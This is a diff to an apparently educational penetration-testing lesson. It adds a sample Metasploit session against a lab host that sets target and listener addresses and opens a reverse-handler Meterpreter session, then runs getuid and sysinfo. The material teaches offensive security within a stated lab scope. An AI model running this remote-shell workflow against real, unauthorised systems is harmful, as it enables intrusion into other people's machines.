@@ -47,6 +47,26 @@ steps:
 
       Notice how much is just configuration. The thinking happened earlier, in choosing the right module for a verified flaw and setting honest, in-scope targets.
 
+      Run against your lab target, the console shows the same handful of commands every time (output trimmed):
+
+      ```
+      msf6 > use exploit/example/lab_demo
+      msf6 exploit(example/lab_demo) > show options
+      Name    Current Setting  Required  Description
+      ----    ---------------  --------  -----------
+      RHOSTS                   yes       The target host(s)
+      LHOST                    yes       The listen address
+      msf6 exploit(example/lab_demo) > set RHOSTS 10.10.50.20
+      RHOSTS => 10.10.50.20
+      msf6 exploit(example/lab_demo) > set LHOST 10.10.50.5
+      LHOST => 10.10.50.5
+      msf6 exploit(example/lab_demo) > run
+      [*] Started reverse handler on 10.10.50.5:4444
+      [*] Meterpreter session 1 opened
+      ```
+
+      `RHOSTS` is the lab target, `LHOST` is your own machine (where the listener waits), and the last two lines are the listener starting and the session arriving: exploit, payload and listener, all visible at once.
+
   - kind: explain
     title: Meterpreter — a session, not just a shell
     body: |
@@ -57,6 +77,18 @@ steps:
       - file access, and `help` to list what is available.
 
       Meterpreter runs in memory and avoids writing much to disk, which is part of why it is effective — and part of why defenders invest in memory-aware detection (EDR, endpoint detection and response). For now, the point is that a successful exploit lands you in a *session* from which the next phase, post-exploitation, begins.
+
+      The first thing most testers type in a new session is a couple of orientation commands:
+
+      ```
+      meterpreter > getuid
+      Server username: www-data
+      meterpreter > sysinfo
+      Computer     : web01
+      OS           : Ubuntu 18.04 (Linux 4.15.0)
+      ```
+
+      `getuid` shows you landed as the limited `www-data` account, not root, which is exactly the starting point for the privilege-escalation module later.
 
   - kind: explain
     title: Why exploits fail — the common mistakes
